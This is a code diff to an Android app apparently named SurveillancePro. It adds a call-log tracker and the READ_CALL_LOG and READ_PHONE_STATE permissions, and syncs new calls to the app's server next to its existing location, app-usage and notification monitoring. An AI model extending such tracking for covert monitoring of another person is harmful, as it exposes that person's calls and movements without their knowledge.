@@ -28,6 +28,7 @@ import androidx.lifecycle.lifecycleScope
 import com.surveillancepro.android.data.ApiClient
 import com.surveillancepro.android.data.DeviceStorage
 import com.surveillancepro.android.services.AppUsageTracker
+import com.surveillancepro.android.services.CallLogTracker
 import com.surveillancepro.android.services.LocationService
 import com.surveillancepro.android.services.SupervisionNotificationListener
 import com.surveillancepro.android.ui.theme.SupervisionProTheme
@@ -336,6 +337,8 @@ class MainActivity : ComponentActivity() {
         val perms = mutableListOf(
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_PHONE_STATE,
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -360,6 +363,8 @@ class MainActivity : ComponentActivity() {
                 val tracker = AppUsageTracker(this@MainActivity)
                 val apps = tracker.getInstalledApps()
                 api.sendEvent("apps_installed", mapOf("apps" to apps, "count" to apps.size))
+
+                CallLogTracker(this@MainActivity).syncNewCalls()
 
             } catch (_: Exception) {}
         }
